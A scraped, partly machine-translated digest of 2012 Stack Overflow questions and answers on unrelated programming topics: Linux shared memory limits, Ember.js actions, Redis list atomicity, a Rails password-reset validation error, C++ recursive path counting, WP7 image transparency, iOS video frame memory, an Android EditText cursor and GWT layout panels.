我有 64 位 Linux 机器（Intel Xeon L5410 @ 2.33GHz）。

```
**meminfo:**
MemTotal:     24672736 kB 
MemFree:        145372 kB 
Buffers:        181896 kB 
Cached:       22004648 kB 
SwapCached:     195072 kB 
Active:        9761028 kB 
Inactive:     13964532 kB 
HighTotal:           0 kB 
HighFree:            0 kB 
LowTotal:     24672736 kB 
LowFree:        145372 kB 
SwapTotal:    17414452 kB 
SwapFree:     15618852 kB 
Dirty:         2125148 kB 
Writeback:           0 kB 
AnonPages:     1358396 kB 
Mapped:        1069632 kB 
Slab:           699464 kB 
CommitLimit:  29750820 kB 
Committed_AS:  9236252 kB 
PageTables:      38620 kB 
VmallocTotal: 34359738367 kB 
VmallocUsed:     17272 kB 
VmallocChunk: 34359718843 kB 
HugePages_Total:     0 
HugePages_Free:      0 
HugePages_Rsvd:      0 
Hugepagesize:     2048 kB 

**Also the shm details are:**
shmall                2097152 
shmmax                3294967296 
shmmni                4096 
```

我正在尝试创建 2 GB 以上的共享内存，shmget 成功，但后来发生核心转储，并出现无法访问内存的错误。虽然低于 2GB 的共享内存工作得非常好。我能够找到任何正当理由，因为我的 shmmax 值约为 3GB

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T05:49:10.063

the maximum `shm` memory size is available thru `/proc/sys/kernel/shmmax` and you could write into that pseudo-file to change it. It probably cannot be raised above some portion (e.g. half) of physical RAM. Perhaps some kernel configuration can change that.

You can also share memory with the [mmap](http://linux.die.net/man/2/mmap) syscall with `MAP_SHARED` flag.

# facebook - 我可以在 Facebook 页面上添加订阅按钮吗？

> ID：10991114
> 
> 赞同：0
> 
> 时间：2012-06-12T05:45:55.290
> 
> 标签：facebook

例如，我想用这个 url 订阅一个 facebook 页面，http://www.myurl.com

```
<iframe src="http://www.facebook.com/plugins/subscribe.php?href=http://www.myurl.com&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;font&amp;width=450&amp;appId=355223321210852" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px;" allowTransparency="true"></iframe> 
```

当我这样做时，它给了我一个错误，就像它只能添加到用户配置文件中一样。我怎样才能有一个页面的订阅按钮？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T05:56:31.873

订阅按钮必须指向 Facebook 个人资料 URL；因此`http://myurl.com`将不起作用。请参阅此处的示例，其中一个有效，一个无效：http: [//jsfiddle.net/6jaP2/](http://jsfiddle.net/6jaP2/)

# ember.js - Ember.js {{action}} 除了点击

> ID：10991115
> 
> 赞同：9
> 
> 时间：2012-06-12T05:46:02.390
> 
> 标签：ember.js

假设我有一个包含多个`button`元素的模板。如果我想观看一个`click`事件，那么我只需使用`{{action}}`助手。但我想不出一种传递其他事件的方法，比如`mouseEnter`or `mouseLeave`。我本来想使用`Ember.Button`并以某种方式完成它，`childViews`但它似乎已被[弃用](https://github.com/emberjs/ember.js/commit/4b2f5e7b8145914cdf451361355acf0fccae49a8)。

模板

```
{{#view App.MyView}}
    <button {{action "btnClicked"}}>button1</button>
    <button {{action "btnClicked"}}>button2</button>
{{/view}} 
```

js

```
App.MyView = Em.View.extend({
    btnClicked: function(e){
       alert('btnClicked');
    },
    btnMouseEnter: function(e){
       alert('btnMouseEnter'); // how to call this?
    }
});​ 
```

我知道我可以使用`{{action "btnMouseEnter" on="mouseEnter"}}`，但后来我失去了点击功能。我是否需要将每个按钮都单独包装起来`Ember.View`？如果是这样，为什么被`Ember.Button`弃用？

**编辑：**

我认为您应该能够让多个事件触发相同的事件`action`

```
<button {{action "myAction" on="click mouseEnter mouseLeave"}}>button</button> 
```

我在我的[fork](https://github.com/icholy/ember.js/commit/59efa5110bda1a764cb97d0f32574e735290944e)中实现了这种行为，[这](http://jsfiddle.net/U3thg/28/)是一个 jsFiddle 演示它的工作原理

**编辑：**

如果有人也对这个功能感兴趣，讨论会在[这里](https://github.com/emberjs/ember.js/pull/994)进行。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T07:46:02.503

非常好的问题恕我直言。

我找到的唯一方法是这个：http: [//jsfiddle.net/Sly7/Zvred/](http://jsfiddle.net/Sly7/Zvred/)

我认为这是一种包装，所以不确定这是一个好的答案......

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-06-12T16:43:41.320

伊利亚...

Ember 团队决定在像 Button 这样的元素上允许多个操作助手并不是最佳实践。他们的建议是使用 sly7_7 建议的视图。请在 Github 上查看此问题报告：

[https://github.com/emberjs/ember.js/issues/569](https://github.com/emberjs/ember.js/issues/569)

# jquery - Is there any method to update a json object and print it as json object in a div using jquery

> ID：10991119
> 
> 赞同：0
> 
> 时间：2012-06-12T05:46:26.003
> 
> 标签：jquery, json

I have updated my jSon object using the code

```
<script type="text/javascript" >
            jQuery(document).ready(function($){
                var lessonId = "3423671";
                $.getJSON('data.json', function(json) {             
                    $.each(json, function(i, data) {
                        $.each(this.courseStarted[0].courseDetails[0].lessonDetails, function(){                            
                            if(this.lessonId == lessonId){                              
                                this.quiz = "This row updated";                             
                            }
                        });
                    });
                });

            });
        </script> 
```

Here i am updating my `json` object inside the if condition. Is there any method to get me the new updated `json` object to print into a html div tag as text in the `json format`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T05:52:36.047

由于`json`有您的对象数据（从您的服务器检索），并且您的代码刚刚更新了它，您可以使用`JSON.stringify(json)`. AFAIK`JSON`大多数浏览器都原生支持该对象。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T05:59:43.463

```
JSON.stringify({ foo: "lorem", bar: "ipsum" }, null, '\t'); 
```

[文档](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/JSON/stringify#space_argument)

# queue - getting Redis list item index

> ID：10991121
> 
> 赞同：2
> 
> 时间：2012-06-12T05:46:40.067
> 
> 标签：queue, redis

I have a list and I'm adding elements using RPUSH which returns the updated length of the list. My question is that, is it reliable to use the returned length - 1 as the index of the newly inserted item?

By reliable I mean, If I have multiple connections to Redis doing the same operation is it guaranteed there won't be any overlapping like the returned length actually returning after two RPUSH that occurred simultaneously or is that Redis' list operation atomic by default or do I need transactions?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:02:37.113

考虑到 redis 命令的原子性，您可以 100% 确定每个 RPUSH 之后都会有相应的整数回复，因此可以安全地假设您的元素的索引是 (integer_reply - 1)。我在这里回答了一个与此相关的[问题](https://stackoverflow.com/questions/9494502/can-multiple-clients-access-same-list-concurrently-without-getting-blocked-in-re/9495096#9495096)。

# java - Strip words between first two forwardslashes

> ID：10991126
> 
> 赞同：1
> 
> 时间：2012-06-12T05:47:42.873
> 
> 标签：java, regex

I have a string

```
String origStr = "/unwanted/wanted1/wanted2/and_so_on" 
```

i want to make this as

```
String finalStr = "wanted1/wanted2/and_so_on" 
```

I thought of doing that using regEx in Java. But struck on this.

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T05:53:13.390

你可以做这样的事情 -

```
 String str = "/unwanted/wanted1/wanted2/and_so_on";
    String temp = str.substring(str.indexOf("/", 1)+1);
    System.out.println(temp); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-12T05:53:23.900

```
origStr.replaceFirst("/[^/]+/", ""); 
```

应该管用

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T05:54:02.013

不使用正则表达式。您可以使用`split("/")`方法将其制成字符串数组。并削减第一个元素。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T05:55:29.710

```
String [] arr= origSTr.split("/"); 
```

根据需要使用此 arr。

# ruby - 1) PasswordResets 在请求密码重置时向用户发送电子邮件

> ID：10991138
> 
> 赞同：-3
> 
> 时间：2012-06-12T05:48:29.410
> 
> 标签：ruby, ruby-on-rails-3, ruby-on-rails-3.2, forgot-password

我一直在尝试为忘记密码的用户添加密码重置。用户点击忘记密码？在注册页面上。然后用户键入他们的电子邮件并单击重置密码，这会创建一个令牌并发送一封电子邮件，其中包含重置密码的链接。在大多数情况下，它仅在电子邮件框为空白或正好有 6 个随机字母/数字时有效，但当用户输入他的电子邮件并单击密码重置时它不起作用，它会显示错误消息：

```
**Validation failed: Password can't be blank
Password cant be blank, password is too short(6 min)** 
```

通过更改**user.rb** **验证：password，presence：true，length：{ minimum: 6 } validates ：password_confirmation，presence：true**

我得到了不同的错误，无论如何要从这个重置密码表单中排除这个验证

```
app/models/user.rb:30:in `send_password_reset'
app/controllers/password_resets_controller.rb:7:in `create' 
```

在视频 275 How I Test 中遇到此错误。11:20

失败/错误：click_button "Reset Password" ActiveRecord::RecordInvalid: 验证失败：密码不能为空，密码太短（最少为 6 个字符），密码确认不能为空

```
 # ./app/models/user.rb:30:in `send_password_reset'
     # ./app/controllers/password_resets_controller.rb:7:in `create'
     # (eval):2:in `click_button'
     # ./spec/requests/password_resets_spec.rb:9:in `block (2 levels) in <top (required)>' 
```

在 13.66 秒内完成 95 个示例，1 个失败

这是正在使用的一些代码。

用户.rb

```
 # == Schema Information
    #
    # Table name: users
    #
    #  id         :integer         not null, primary key
    #  name       :string(255)
    #  email      :string(255)
    #  created_at :datetime        not null
    #  updated_at :datetime        not null
    #

    class User < ActiveRecord::Base
     attr_accessible :name, :email, :password, :password_confirmation
     has_secure_password

      before_save { |user| user.email = email.downcase }
      before_save :create_remember_token

      validates :name, presence: true, length: { maximum: 50 }
      VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i
      validates :email, presence:   true,
                format:     { with: VALID_EMAIL_REGEX },
                uniqueness: { case_sensitive: false }
      validates :password, presence: true, length: { minimum: 6 }
      validates :password_confirmation, presence: true

      def send_password_reset
        generate_token(:password_reset_token)
        self.password_reset_sent_at = Time.zone.now
        save!
        UserMailer.password_reset(self).deliver
      end

      def generate_token(column)
        begin
          self[column] = SecureRandom.urlsafe_base64
        end while User.exists?(column => self[column])
      end

      def self.search(search)
        if search
          find(:all, :conditions => ['name LIKE ?', "%#{search}%"])
        else
          find(:all)
        end
      end

      private

        def create_remember_token
          self.remember_token = SecureRandom.urlsafe_base64
        end
    end 
```

密码重置控制器.rb

```
 class PasswordResetsController < ApplicationController
      def new
      end

      def create
        user = User.find_by_email(params[:email])
        user.send_password_reset
        redirect_to root_url, :notice => "Email sent with password reset instructions."
      end

      def edit
        @user = User.find_by_password_reset_token!(params[:id])
      end
    end 
```

密码重置规范

```
 require 'spec_helper'

    describe "PasswordResets" do
      it "emails user when requesting password reset" do
        user = Factory(:user)
        visit signin_path
        click_link "password"
        fill_in "Email", :with => user.email
        click_button "Reset Password"
        current_path.should eq(root_path)
        page.should have_content("Email sent")
        last_email.to.should include(user.email)
      end
    end 
```

user_spec.rb

```
 # == Schema Information
    #
    # Table name: users
    #
    #  id         :integer         not null, primary key
    #  name       :string(255)
    #  email      :string(255)
    #  created_at :datetime        not null
    #  updated_at :datetime        not null
    #

    require 'spec_helper'

    describe User do

      describe "#send_password_reset" do
        let(:user) { Factory(:user) }

        it "generates a unique password_reset_token each time" do
          user.send_password_reset
          last_token = user.password_reset_token
          user.send_password_reset
          user.password_reset_token.should_not eq(last_token)
        end

        it "saves the time the password reset was sent" do
          user.send_password_reset
          user.reload.password_reset_sent_at.should be_present
        end

        it "delivers email to user" do
          user.send_password_reset
          last_email.to.should include(user.email)
        end
      end

      before do
        @user = User.new(name: "Example User", email: "user@example.com", 
                 password: "foobar", password_confirmation: "foobar")
      end

      subject { @user }

      it { should respond_to(:name) }
      it { should respond_to(:email) }
      it { should respond_to(:password_digest) }
      it { should respond_to(:password) }
      it { should respond_to(:password_confirmation) }
      it { should respond_to(:remember_token) }
      it { should respond_to(:authenticate) }

      it { should respond_to(:admin) }
      it { should respond_to(:authenticate) }

      it { should be_valid }
      it { should_not be_admin }

      describe "with admin attribute set to 'true'" do
        before { @user.toggle!(:admin) }

        it { should be_admin }
      end

      describe "when name is not present" do
        before { @user.name = " " }
        it { should_not be_valid }
      end

      describe "when email is not present" do
        before { @user.email = " " }
        it { should_not be_valid }
      end

      describe "when name is too long" do
        before { @user.name = "a" * 51 }
        it { should_not be_valid }
      end

      describe "when email format is invalid" do
        it "should be invalid" do
          addresses = %w[user@foo,com user_at_foo.org example.user@foo.
                   foo@bar_baz.com foo@bar+baz.com]
          addresses.each do |invalid_address|
            @user.email = invalid_address
            @user.should_not be_valid
          end      
        end
       end

      describe "when email format is valid" do
        it "should be valid" do
          addresses = %w[user@foo.COM A_US-ER@f.b.org frst.lst@foo.jp a+b@baz.cn]
          addresses.each do |valid_address|
            @user.email = valid_address
            @user.should be_valid
          end      
        end
      end

      describe "when email address is already taken" do
        before do
          user_with_same_email = @user.dup
          user_with_same_email.email = @user.email.upcase
          user_with_same_email.save
        end

        it { should_not be_valid }
      end

      describe "email address with mixed case" do
        let(:mixed_case_email) { "Foo@ExAMPle.CoM" }

        it "should be saved as all lower-case" do
          @user.email = mixed_case_email
          @user.save
          @user.reload.email.should == mixed_case_email.downcase
        end
      end

      describe "when password is not present" do
        before { @user.password = @user.password_confirmation = " " }
        it { should_not be_valid }
      end

      describe "when password doesn't match confirmation" do
        before { @user.password_confirmation = "mismatch" }
        it { should_not be_valid }
      end

      describe "when password confirmation is nil" do
        before { @user.password_confirmation = nil }
        it { should_not be_valid }
      end

      it { should respond_to(:authenticate) }

      describe "with a password that's too short" do
        before { @user.password = @user.password_confirmation = "a" * 5 }
        it { should be_invalid }
      end

      describe "return value of authenticate method" do
        before { @user.save }
        let(:found_user) { User.find_by_email(@user.email) }

        describe "with valid password" do
          it { should == found_user.authenticate(@user.password) }
        end

       describe "with invalid password" do
          let(:user_for_invalid_password) { found_user.authenticate("invalid") }

          it { should_not == user_for_invalid_password }
          specify { user_for_invalid_password.should be_false }
        end
      end

      describe "remember token" do
        before { @user.save }
        its(:remember_token) { should_not be_blank }
      end
    end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-19T17:28:34.513

在您使用的 send_password_reset 方法中：

```
save! 
```

改为使用

```
save!(validate: false) 
```

一切都会奏效。问题是您正在尝试保存模型并且验证正在干扰。您不需要验证 send_password_reset 方法中的任何内容，因为用户没有生成任何内容，因此不存在将无效信息保存到数据库的危险。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T22:35:08.510

乍一看，重置密码时，您的代码试图保存空白密码（因此出现错误）。尝试一次调试一行，`logger.debug`以尝试在保存密码之前找出您的代码在什么时候使密码无效。我没有使用过 UserMailer，但看起来错误与`UserMailer.password_reset(self).deliver`线路有关。如果你写了这个方法，我会先调试一下。如果它是自动化的，请尝试调试为邮件程序设置所有参数以生成令牌并重置密码的部分。

希望这可以帮助。

# c++ - where i am wrong in this recursion

> ID：10991139
> 
> 赞同：3
> 
> 时间：2012-06-12T05:48:33.110
> 
> 标签：c++, algorithm, recursion

Sir, these days i am improving my recursion skills but i am stuck in one of the recursion problem of "Cracking the coding skills" book. Problem number 8.2
Problem statement is -- Imagine a robot sitting on the upper hand corner of an N*N grid. The robot can only move in two directions: right and down. How many possible patha are there for the robot ?

I tried a lot but it only shows me a single path. My code is (taking help from solution of book)

```
#include<iostream>
#include<vector>

using namespace std;

struct point {
    int x;
    int y;
};
vector<struct point *> v_point;

int findPath(int x, int y) {
    struct point *p = new point;
    p->x = x;
    p->y = y;
    v_point.push_back(p);
    if(x == 0 && y == 0) {
        cout << "\n\t" << x << "  " << y;
        return true;
    }
    int success = 0;
    if( x >= 1 ) {
        cout << "\n success = " << success << " x =  " << x << "  "  << " y = " << y;
        success = findPath(x-1, y);
        cout << "\n success = " << success << " x =  " << x << "  "  << " y = " << y;
    }
    if(!success && y >= 1) {
        cout << "\n\t success = " << success << " x =  " << x << "  "  << " y = " << y;
        success = findPath(x, y-1);
        cout << "\n\t success = " << success << " x =  " << x << "  "  << " y = " << y;
    }
    if(!success){
        cout << "\n\t\t success = " << success << " x =  " << x << "  "  << " y = " << y;
        v_point.pop_back();
        cout << "\n\t\t success = " << success << " x =  " << x << "  "  << " y = " << y;
    }
    return success;
}

main() {
    cout << endl << findPath(3, 3);
    return 0;
} 
```

I put printf statement to check where i am wrong, but i didn't find mistake. Please help me.

I wrote the code given by your instructions. But , if I want to print all the paths, it gives undesired answer.

```
int findPath(int x, int y) {
    if(x == 0 && y == 0) { cout << endl; return 1; }
    int path = 0;
    if(x > 0) { cout << "d -> ";path = path + findPath(x-1, y);  } // d = down
    if(y > 0) { cout << "r ->  ";path = path + findPath(x, y-1);  } // r = right
    return path;
} 
```

for grid of 3*3 It gives ( findPaths(2, 2) ) :-

```
d -> d ->r -> r ->
r -> d -> r ->
r -> d->
r -> d -> d -> r ->
r -> d ->
r -> d -> d -> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T05:56:37.120

您的问题是，当 时`x >= 1`，您正在递减`x`并设置`success`为 true。这可以防止您的代码探索 decrementing `y`。

正确的递归规则是：

1.  如果`x == 0 && y == 0`，则返回 1（空路径是唯一路径）
2.  将路径数初始化为0
3.  如果然后添加（递归调用）`x > 0`产生的路径数`x - 1`
4.  如果然后添加（递归调用）`y > 0`产生的路径数`y - 1`
5.  返回添加的路径总数

请注意，您必须*同时*执行第 2 步和第 3 步。您的代码仅执行 2（成功并阻止第 3 步执行）。

**编辑**

如果你需要自己输出路径，那么你需要在递归时累积路径，只有在到达目的地时才打印出来。（你这样做的方式——在下降时打印每一步——是行不通的。考虑从 (2,2) 到 (0,0) 的所有路径，通过 (1,1)。从 (2) 开始的每个路径段,2) 到 (1,1) 需要打印多次：从 (1,1) 到 (0,0) 的每个路径段一次。如果在递归时打印，则不能这样做。）

执行此操作的一种方法是将路径编码为长度等于预期路径长度的数组（所有路径都将完全是`x + y`步长），并在您使用移动方向的代码时将其填充。这是一种方法：

```
static const int DOWN = 0;
static const int RIGHT 1;
int findPath(int x, int y, int *path, int len) {
    if (x == 0 && y == 0) {
        printPath(path, len);
        return 1;
    }
    int n = 0;
    if (x > 0) {
        path[len] = DOWN;
        n += findPath(x-1, y, path, len + 1);
    }
    if (y > 0) {
        path[len] = RIGHT;
        n += findPath(x, y-1, path, len + 1);
    }
    return n;
}

void printPath(int *path, int len) {
    if (len == 0) {
        cout << "empty path";
    } else {
        cout << (path[0] == DOWN ? " d" : " r");
        for (int i = 1; i < len; ++i) {
            cout << " -> " << (path[i] == DOWN ? " d" : " r";
        }
    }
    cout << endl;
} 
```

你可以这样称呼：

```
int *path = new int[x + y];
cout << "Number of paths: " << findPath(x, y, path, 0) << endl;
delete [] path; 
```

# c# - How to save bitmap image with transparent background in wp7

> ID：10991142
> 
> 赞同：4
> 
> 时间：2012-06-12T05:48:47.430
> 
> 标签：c#, windows-phone-7.1

Hello Everyone I am new to wp7.

My issue is I'm saving bitmap image but the background of the image is not Transparent. See my code below:

```
IsolatedStorageFileStream fileStream = myIsolatedStorage.CreateFile(fileName);

var bitmap = new WriteableBitmap(500, 700);
bitmap.Render(paint, null);
bitmap.Invalidate();

WriteableBitmap wb = new WriteableBitmap(bitmap);

wb.SaveJpeg(fileStream, wb.PixelWidth, wb.PixelHeight, 0, 85);
fileStream.Close(); 
```

How can I save a bitmap image with a transparent background ?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T06:06:49.010

JPEG 文件不允许透明度。GIF 和 PNG 格式可以。

因此，您可以将文件保存为 PNG 或 GIF 格式。查看 Codeplex 上的[ImageTools 库](http://imagetools.codeplex.com/)。使用这个库很容易将您的位图数据保存为保留透明度信息的格式。

这篇文章有点老了，但 Jaime Rodriguez 使用这个库写了一个例子：http: [//blogs.msdn.com/b/jaimer/archive/2010/11/23/working-with-gif-images-in-windows -电话.aspx](http://blogs.msdn.com/b/jaimer/archive/2010/11/23/working-with-gif-images-in-windows-phone.aspx)。我会在这里发布一些有趣的代码，但不幸的是 Skydrive 被我的代理阻止了 :-)

您可能有兴趣在 SitePoint 上一篇过时但仍然有效的文章中查看我上面提到的三种格式之间的差异：[http ://www.sitepoint.com/gif-png-jpg-which-one-to-use/](http://www.sitepoint.com/gif-png-jpg-which-one-to-use/)

# ajax - trouble with "posting" svg in xml using ajax on jsfiddle

> ID：10991144
> 
> 赞同：2
> 
> 时间：2012-06-12T05:48:56.953
> 
> 标签：ajax, svg, xmlhttprequest, jsfiddle

Here's the fiddle:

[http://jsfiddle.net/k2CAs/](http://jsfiddle.net/k2CAs/)

(I want to test if and how ajax requests for svg are handled differently from inline svg.)

The console says there's an error. But I've read through the xml and svg headers carefully and I don't see a typo. Is this an issue with jsfiddle itself or am I doing something wrong? Is this just another case of jquery not playing well with svg? Help very appreciated...

UPDATE: D'oh! I fixed the typo, and reduced the number of svg elements for simplicity but the xml response logged in the console is `null`:

[http://jsfiddle.net/k2CAs/4/](http://jsfiddle.net/k2CAs/4/)

I've fiddled and fiddled with the various content and data settings. Is there some special way I need to set up the posted svg to deserialize correctly to xml? Is that not handled by jquery? (And yes, I've looked carefully at the jquery ajax docs.)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T09:16:31.070

你有`xml: "<?xml version="1.0" ...</svg>"`

此字符串由双引号（: 之后的那个）限定，但内部也包含双引号，因此它不会像您认为的那样做。

解决方案是对数据使用一种引号类型（单引号或双引号），另一种将其作为字符串包含。在这种情况下，最简单的解决方案是替换初始和最终引号，这样您就可以：

`xml: '<?xml version="1.0" ...</svg>'`

# ios5 - Crash of app with low memory when converting video into frames in ios 5.1(with ARC)

> ID：10991150
> 
> 赞同：1
> 
> 时间：2012-06-12T05:49:08.817
> 
> 标签：ios5, automatic-ref-counting, avfoundation, video-capture

I had captured the video using AVFoundation and When I am trying to convert the video captured into Frames my app is crashed coz of low memory. I am using the project with ios 5.1 and ARC enabled.

Here my code follows:

```
-(void) makeVideoCall
{
    videoOutput = [[AVCaptureVideoDataOutput alloc]init];
    [captureSession addOutput:videoOutput];
    videoOutput.videoSettings =
    [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:kCVPixelFormatType_32BGRA]
                                forKey:(id)kCVPixelBufferPixelFormatTypeKey];
    videoOutput.alwaysDiscardsLateVideoFrames = YES;
    dispatch_queue_t queue = dispatch_queue_create("MyQueue", NULL);
    [videoOutput setSampleBufferDelegate:self queue:queue];
    dispatch_release(queue);

    [videoOutput setSampleBufferDelegate:self queue:queue];
    [captureSession startRunning];
}

- (void)captureOutput:(AVCaptureOutput *)captureOutput didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer fromConnection:(AVCaptureConnection *)connection
{
    NSLog(@"\n Inside CaptureOutput....");

    CGImageRef tempImage = [self imageRefFromSampleBuffer:sampleBuffer];
    image = [[UIImage alloc] initWithCGImage:tempImage scale:0.2 orientation:UIImageOrientationLeftMirrored];
}

-(CGImageRef)imageRefFromSampleBuffer:(CMSampleBufferRef)sampleBuffer {

    CVImageBufferRef imageBuffer = CMSampleBufferGetImageBuffer(sampleBuffer); 
    CVPixelBufferLockBaseAddress(imageBuffer,0); 
    uint8_t *baseAddress = (uint8_t *)CVPixelBufferGetBaseAddress(imageBuffer); 
    size_t bytesPerRow = CVPixelBufferGetBytesPerRow(imageBuffer); 
    size_t width = CVPixelBufferGetWidth(imageBuffer); 
    size_t height = CVPixelBufferGetHeight(imageBuffer); 

    CGColorSpaceRef colorSpace = CGColorSpaceCreateDeviceRGB(); 
    CGContextRef context = CGBitmapContextCreate(baseAddress, width, height, 8, bytesPerRow, colorSpace, kCGBitmapByteOrder32Little | kCGImageAlphaPremultipliedFirst); 
    CGImageRef newImage = CGBitmapContextCreateImage(context); 
    CVPixelBufferUnlockBaseAddress(imageBuffer,0);
    CGContextRelease(context); 
    CGColorSpaceRelease(colorSpace);
    return newImage;

} 
```

Anyone pls advice me what to do.

Regards, Monish.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T15:37:46.787

您可能需要使用 CFRelease(cgImageRef) 来释放 CGImageRef 对象。您可以转到 Xcode 并在产品栏中单击分析。它将帮助您分析您的代码，并可能给您带来可能的内存泄漏。

# android - Android EditText 焦点问题

> ID：10991153
> 
> 赞同：0
> 
> 时间：2012-06-12T05:49:32.220
> 
> 标签：android, focus, android-edittext

在 EdiText 中设置焦点时遇到问题。下面是我的 EditText 属性。

```
 <EditText
                    android:id="@+id/gatekeeperDetailedtUnitNo"
                    android:layout_width="270dip"
                    android:layout_height="wrap_content"
                    android:layout_below="@id/gatekeeperDetailtxtUnitNo"
                    android:layout_marginTop="10dip"
                    android:hint="@string/unit_number"
                    android:inputType="number"
                    android:maxLength="8"
                    android:lines="1" /> 
```

现在我在 6 位数字后添加了“-”。为此，我实现了 TextWatcher。

```
 edtUnitNo.addTextChangedListener(new TextWatcher() {

        /**
         * This method is used to change charSequence when user enter more
         * then 6 character.
         */
        public void onTextChanged(CharSequence s, int start, int before,
                int count) {
            if (count < 7) {
                if (s.toString().contains("-")) {
                    Log.e(TAG, "< 7 Called");
                    String[] st1;
                    st1 = s.toString().split("-");
                    String st2 = st1[0];
                    edtUnitNo.setText(st2);
                    edtUnitNo.requestFocus();
                    edtUnitNo.requestFocus(EditText.FOCUS_RIGHT);
                }
            }
            if (edtUnitNo.getText().toString().length() == 7) {
                Log.e(TAG, "== 7 Called");
                String s1 = edtUnitNo.getText().toString();
                String s2 = s1.substring(0, 6);
                char s3 = s.charAt(6);
                edtUnitNo.setText(s2 + "-" + s3);
            }
        }

        public void beforeTextChanged(CharSequence s, int start, int count,
                int after) {

        }

        public void afterTextChanged(Editable s) {

        }
    }); 
```

例如。我的 EditText 值看起来像“123456-7”。当我添加 7 位数字和“-”时，我遇到了问题。当我试图删除最后一个字符“7”时，焦点来到第 0 个位置。

但我想把焦点放在最后删除的字符位置（6 之后）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:00:58.173

放入`edtUnitNo.setSelection(edtUnitNo.getText().length());`afterTextChanged 函数........

# gwt - Design a GWT UI Layout

> ID：10991155
> 
> 赞同：0
> 
> 时间：2012-06-12T05:49:39.550
> 
> 标签：gwt

We wanted to design a layout in GWT which has quite a lot of small small sections on screen. Basically it has a left menu, header, footer, main content area with lot of sub sections which can be closed by user in case if he does not want to see them. Then remaining content section should get adjusted automatically. We are using GWT Platform. I am in doubt, whether DockLayoutPanel suits for this or not, because, it has to be must more flexible. Apart from that, I didnt get any good layout examples. Can we achieve this using GWT ![enter image description here](../Images/1b0d902ccbca64ae27ad0fd36eb0d95e.png)panels or we have to manually do it using div in module html file?

Please find below the draft layout. I am really confused with what panel to start.... Kindly advice.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T09:07:27.907

有数百万种方法可以实现这一目标。我会给你我的意见，并尝试解释为什么我会这样做。

首先，就像大多数网站一样，您似乎想要一个顶部标题（或两个）和左侧的菜单。DockLayoutPanel 可以很好地做到这一点，所以我会从它开始。顺便说一句，考虑在你的布局中添加一个页脚（抱歉，只是认为大多数应用程序都有一个）......

然后，左侧有两个小面板（Tree Str1 和 2）和内容区域。根据您希望它们的灵活性，您将需要不同的结构。

假设您希望左侧不仅有两个，而且可能有很多 Tree Str，并且您的内容区域不会有太大变化。我会在 DockLayoutPanel 的西部区域添加一个 VerticalPanel（其中将包含 2 个 Tree Strs，可能更多）。

在 DockLayoutPanel 的主区域中，添加一个 VerticalPanel 来表示中心区域。此 VerticalPanel 的大小必须适当（可能宽度、高度=100%）。

添加到 VerticalPanel 2 行 (Horizo​​ntalPanels)。

现在，您可以将内容区 1 添加到第一行，将其他内容区添加到第 2 行。

好吧，让代码说话：

```
public Panel getMainPanel() {
    DockLayoutPanel mainPanel = new DockLayoutPanel(Unit.PX);
    mainPanel.setSize("500px", "500px");

    VerticalPanel leftPanel = new VerticalPanel();

    Label treeStr1 = new Label("Tree Str1");
    treeStr1.setSize("100%", "100px");
    Label treeStr2 = new Label("Tree Str2");
    treeStr1.setSize("100%", "200px");

    leftPanel.add(treeStr1);
    leftPanel.add(treeStr2);

    VerticalPanel centralArea = new VerticalPanel();
    centralArea.setSize("100%", "100%");
    centralArea.setHorizontalAlignment(HasHorizontalAlignment.ALIGN_CENTER);
    centralArea.setVerticalAlignment(HasVerticalAlignment.ALIGN_MIDDLE);
    centralArea.getElement().getStyle().setBorderStyle(BorderStyle.SOLID);

    HorizontalPanel row1 = new HorizontalPanel();
    row1.setWidth("90%");
    HorizontalPanel row2 = new HorizontalPanel();
    row2.setWidth("90%");
    row2.getElement().getStyle().setBorderStyle(BorderStyle.SOLID);
    row2.getElement().getStyle().setBorderColor("red");
    row2.setHorizontalAlignment(HasHorizontalAlignment.ALIGN_LEFT);

    centralArea.add(row1);
    centralArea.add(row2);

    HTML ca1 = new HTML("Content Area 1");
    ca1.setSize("100%", "100px");
    ca1.getElement().getStyle().setBorderStyle(BorderStyle.SOLID);
    HTML ca2 = new HTML("Content Area 2");
    ca2.setSize("60%", "60px");
    ca2.getElement().getStyle().setBorderStyle(BorderStyle.SOLID);
    HTML ca3 = new HTML("Content Area 3");
    ca3.setSize("30%", "60px");
    ca3.getElement().getStyle().setBorderStyle(BorderStyle.SOLID);

    row1.add(ca1);
    row2.add(ca2);
    row2.add(ca3);

    mainPanel.addNorth(new HTML(
            "<h1>This is your header, create a Widget instead of this</h1>"), 150);
    mainPanel.addNorth(new HTML(
            "<h2>Some more user options</h2>"), 60);
    mainPanel.addWest(leftPanel, 150);
    mainPanel.add(centralArea);
    return mainPanel;
} 
```

如果这些领域中的任何一个必须非常灵活，请尝试 GWT 的[FlexTable](http://google-web-toolkit.googlecode.com/svn/javadoc/2.4/com/google/gwt/user/client/ui/FlexTable.html)！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-14T07:44:52.847

